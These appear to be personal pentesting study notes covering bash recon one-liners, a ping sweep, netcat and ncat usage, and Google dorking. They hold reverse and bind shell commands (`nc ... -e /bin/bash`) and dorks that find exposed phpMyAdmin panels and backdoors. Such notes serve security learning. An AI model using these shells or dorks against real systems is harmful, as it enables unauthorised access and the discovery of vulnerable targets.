# Tools

## Bash

The task is to get all urls on the page www.cisco.com

* content of the page can be downloaded with   
  `wget www.cisco.com`
* one line of the file `index.html` looks like that  
  `<li><a,href="http://newsroom.cisco.com/">Newsroom</a></li>`
* we can use a one liner to solve the task    
    * `grep` searches for given string  
    * `cut` gets a delimiter with `-d` and returns the field `-f`
    * `sort -u` shows only unique strings  

```
grep "href=" index.html | cut -d "/" -f 3 | grep "\." | cut -d '"' -f 1 | sort -u
```
loop over the input of a file line by line
```
for url in $(cat list.txt); do host $url; done
```

Ping Sweep
```
#!/bin/bash

echo "Ping Sweep"

for ip in {0..254}
do
        ping -c1 192.168.178.$ip| grep "bytes from"|cut -d " " -f4|cut -d ":" -f1 &
done
```

!!! info
    * Bind Shell: Server is listening
    * Reverse Shell: Client is listening

## Netcat

* Switches used
    * `-l` listen for connection
    * `-n` Do not do any DNS or service lookups
    * `-v` verbose
    * `-p` source port

* Chat
    * Client: `nc -nv <server ip addr> <open port on server>`
    * Sever: `nc -nlvp <listening port>`

* File transfer
    * Client: `nc -nv <server ip addr> 4444 < sending.exe`
    * Sever: `nc -nlvp 4444 > incoming.exe`

* Bind Shell
    * Client: `nc -vn <server ip addr> 4444`
    * Server: `nc -nlvp 4444 -c <path to shell>`

* Reverse Shell
    * Server has no public ip
    * Client: `nc -nlvp 4444`
    * Server: `nc -vn <client ip addr> 4444 -e /bin/bash`

## Ncat

* improved **Netcat** adds:
    * encryption
    * access limitation

* Bind Shell
    * Client `ncat -v <server ip addr> <open port on server>`
    * Server `ncat -lvp <listening port> -e <path to shell> --allow <client ip addr> --ssl`

## Wireshark
* Follow TCP Stream

## Tcpdump

## Information Gathering

### Active

### Passive
* Google Hacking
    * `site:"<url of website>"`
        * gets all subdomains
        * size of webpresenz
    * `-site:"<url of website>"`
        * exclude these
    * `filetype:<file extesion>`
        * ex.: ppt, pdf, txt
    * `"<search string>"` search the exact string
    * `intitle:"<string>"`
    * `inurl:"</path/for/search>"`
    * `inurl:.php? intext:CHARACTER_SETS,COLLATIONS intitle:phpmyadmin`
        * searching for unprotected phpmyadmin panels
    * `intitle:"-N3t" filetype:php undetectable`
        * searching after string found in backdoor
    * [Google Hacking Database](https://www.exploit-db.com/google-hacking-database)